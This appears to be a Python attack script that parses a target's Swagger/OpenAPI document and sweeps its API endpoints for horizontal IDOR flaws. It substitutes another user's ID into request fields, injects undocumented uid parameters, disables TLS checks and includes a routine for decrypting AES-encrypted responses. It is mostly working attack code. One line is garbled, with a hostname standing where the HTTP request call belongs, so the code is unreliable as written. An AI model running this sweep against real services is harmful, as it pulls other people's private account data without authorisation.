#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Swagger-driven horizontal IDOR sweep. Generic: point it at any OpenAPI 2.0 doc + two identities."""
import base64, io, json, re, sys, time, urllib.parse
import requests
requests.packages.urllib3.disable_warnings()

HOST    = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com'
DOC     = sys.argv[2] if len(sys.argv) > 2 else HOST + '/swagger/doc.json'
TOKEN   = sys.argv[3] if len(sys.argv) > 3 else 'YOUR_TOKEN'
ME      = sys.argv[4] if len(sys.argv) > 4 else '1000'
OTHER   = sys.argv[5] if len(sys.argv) > 5 else '2000'
SLEEP   = 0.35

IDKEYS = ['uid','user_id','userid','anchor_id','anchorid','anchor','id','live_id','liveid',
          'to_uid','target_uid','from_uid','room_id','roomid','group_id','groupid','match_id',
          'order_id','orderid','ticket_id','bank_id','account_id','member_id','agent_id']
WRITE  = ['edit','update','set','save','create','change','modify','reset','delete','del',
          'cancel','remove','kick','ban','send','apply','commit','grab','charge','pay','like',
          'share','clean','close','settle','quit','clear','upload','bind','unbind','attent',
          'favorite','revoke','provide','use','record','read','logout','deactive']
# 若目标响应是 IS_ENCRYPT（CryptoJS AES-256-CBC/Pkcs7，密文 base64+urlencode+8位hex时间戳），
# 填上 key 前缀与 IV 即可。KEY_PREFIX 常见形态：'ADKOPSTF' + 某常量串。
KEY_PREFIX = None
IV         = None

def decrypt(blob):
    """Return plaintext object for an encrypted envelope, else None."""
    if KEY_PREFIX is None or not isinstance(blob, str) or len(blob) < 20:
        return None
    tail = blob[-8:]
    if not re.fullmatch(r'[0-9A-F]{8}', tail):
        return None
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        raw = base64.b64decode(urllib.parse.unquote(blob[:-8]))
        pt = unpad(AES.new((KEY_PREFIX + tail).encode(), AES.MODE_CBC, IV.encode()).decrypt(raw), 16)
        t = pt.decode('utf-8', 'replace').strip()
        try:
            return json.loads(t)
        except Exception:
            return t
    except Exception:
        return None

def call(path, body, token=TOKEN, uid=ME, timeout=20):
    try:
        r = target9.example.com(HOST + path, data=json.dumps(body),
                          headers={'Authorization': 'token=%s; uid=%s' % (token, uid),
                                   'Content-Type': 'application/json;charset=UTF-8'},
                          timeout=timeout, verify=False)
        j = {}
        try:
            j = r.json()
        except Exception:
            pass
        plain = decrypt(j.get('data')) if isinstance(j.get('data'), str) else j.get('data')
        return {'status': j.get('status'), 'msg': j.get('msg'), 'plain': plain,
                'text': r.text, 'http': r.status_code}
    except Exception as e:
        return {'exc': '%s %s' % (type(e).__name__, str(e)[:60])}

def dlen(r):
    if not r or 'exc' in r:
        return -1
    p = r.get('plain')
    return len(json.dumps(p, ensure_ascii=False)) if p is not None else 0

def defaults(props):
    b = {}
    for k, v in (props or {}).items():
        if not isinstance(v, dict) or '$ref' in v:
            continue
        b[k] = 1 if v.get('type') == 'integer' else ('' if v.get('type') == 'string' else None)
    for p in ('page', 'pageIndex'):
        if p in b: b[p] = 1
    for p in ('size', 'limit', 'pageSize'):
        if p in b: b[p] = 20
    return {k: v for k, v in b.items() if v is not None}

# ---- 1. parse swagger ----
doc = requests.get(DOC, verify=False, timeout=20).json()
paths, defs = doc.get('paths', {}), doc.get('definitions', {})
print('swagger: %d paths / %d definitions' % (len(paths), len(defs)))

plan = {}
for p, item in paths.items():
    for m, spec in item.items():
        if m != 'post':
            continue
        ref = None
        for prm in spec.get('parameters') or []:
            if prm.get('in') == 'body' and prm.get('schema'):
                ref = prm['schema'].get('$ref')
        d = defs.get(ref.split('/')[-1], {}) if ref else {}
        plan[p] = {'props': list((d.get('properties') or {}).keys()),
                   'base': defaults(d.get('properties'))}

# ---- 2. read-only id sweep with baseline contrast ----
print('\n=== read-only IDOR sweep (ME=%s vs OTHER=%s) ===' % (ME, OTHER))
for p, v in sorted(plan.items()):
    if any(w in p.lower() for w in WRITE):
        continue
    hits = [k for k in v['props'] if k.lower() in IDKEYS]
    if not hits:
        continue
    bo = dict(v['base']);  [bo.__setitem__(k, int(OTHER) if str(OTHER).isdigit() else OTHER) for k in hits]
    bm = dict(v['base']);  [bm.__setitem__(k, int(ME) if str(ME).isdigit() else ME) for k in hits]
    ro, rm = call(p, bo), call(p, bm)
    time.sleep(SLEEP)
    so, sm = dlen(ro), dlen(rm)
    flag = ''
    if ro.get('status') == 0 and so > 0 and sm <= 0:
        flag = ' <<< OTHER-ONLY DATA'
    elif ro.get('status') == 0 and so > sm + 30:
        flag = ' <<< other>me'
    print('[%-44s] o(%-5d) m(%-5d) st=%-4s %s%s' % (p, so, sm, ro.get('status'),
          json.dumps(ro.get('plain'), ensure_ascii=False)[:160], flag))

# ---- 3. undocumented-parameter injection on no-id endpoints ----
print('\n=== undocumented uid/user_id injection on every endpoint ===')
for p, v in sorted(plan.items()):
    if any(w in p.lower() for w in WRITE) or any(k.lower() in IDKEYS for k in v['props']):
        continue
    bo = dict(v['base']); bo['uid'] = int(OTHER) if str(OTHER).isdigit() else OTHER
    bo['user_id'] = bo['uid']
    r = call(p, bo, timeout=15)
    time.sleep(SLEEP)
    if r.get('status') == 0 and dlen(r) > 40:
        print('[%-44s] %s' % (p, json.dumps(r.get('plain'), ensure_ascii=False)[:200]))
